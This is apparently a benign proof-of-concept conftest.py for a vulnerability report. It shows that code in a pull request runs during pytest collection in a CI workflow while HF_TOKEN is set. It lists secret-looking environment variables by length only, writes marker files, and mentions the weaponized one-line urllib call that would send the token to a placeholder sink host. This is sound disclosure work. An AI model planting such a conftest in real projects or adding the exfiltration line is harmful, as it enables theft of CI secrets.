# =====================================================================
# BENIGN PoC PAYLOAD — attacker-controlled conftest.py, collected by
# pytest during test discovery inside the `Core tests (units)` step of
# .github/workflows/test.yml.
#
# What this proves (fairchem-equivalent claim):
#   (1) attacker-supplied code inside a PR IS executed by pytest during
#       test collection, without any explicit test being run;
#   (2) at the moment of that execution, HF_TOKEN is in the process
#       environment (because the `Core tests` step's env: block sets it).
#
# Safety:
#   - We only read len(HF_TOKEN). The value is never printed, logged,
#     written to disk, or transmitted.
#   - No network I/O. No filesystem writes outside /tmp on the ephemeral
#     runner.
#   - We do not raise / do not fail collection — pytest proceeds normally.
# =====================================================================
import os
import re

# Enumerate ANY env var whose NAME looks secret-ish. We only ever read
# len(), never the value.
_secret_env_names = sorted(
    n for n in os.environ
    if re.search(r"(TOKEN|SECRET|KEY|PASSWORD|API|AWS_|GH_|GITHUB_TOKEN)", n)
)
_observations = [f"{n} len={len(os.environ.get(n, ''))}" for n in _secret_env_names]

marker_lines = [
    "PWN_MARKER conftest.py imported during pytest collection.",
    "Attack sink = pytest test-discovery, NOT setup.py.",
    "This matches fairchem test.yml lines 100-146: `pip install` (no",
    "secrets in env) followed by `pytest ${{ matrix.shard.paths }}`",
    "with `env: HF_TOKEN: ${{ secrets.HF_TOKEN }}` on the pytest step.",
    "",
    "Observed secret-ish env vars (LENGTH only, values never printed):",
] + [f"  - {o}" for o in _observations] + [
    "",
    "A real attacker's conftest would replace the length observation",
    "with a one-line `urllib.request.urlopen(f'https://sink/{token}')`.",
    "This PoC deliberately does not. See",
    "evidence/WEAPONIZED-PAYLOAD-NOT-EXECUTED.md for the source of that",
    "variant.",
]
_marker = "\n".join(marker_lines) + "\n"

# Belt-and-suspenders visibility. Pytest with -v captures stdout by
# default but shows it on failure; we also write to a file that a
# subsequent workflow step surfaces.
for _stream in (1, 2):
    try:
        os.write(_stream, _marker.encode())
    except Exception:
        pass

try:
    with open("/tmp/pwn_marker.txt", "w", encoding="utf-8") as _f:
        _f.write(_marker)
except Exception:
    pass

_summary = os.environ.get("GITHUB_STEP_SUMMARY")
if _summary:
    try:
        with open(_summary, "a", encoding="utf-8") as _f:
            _f.write(
                "### PWN_MARKER (pytest-collection sink)\n\n```\n"
                + _marker
                + "```\n"
            )
    except Exception:
        pass
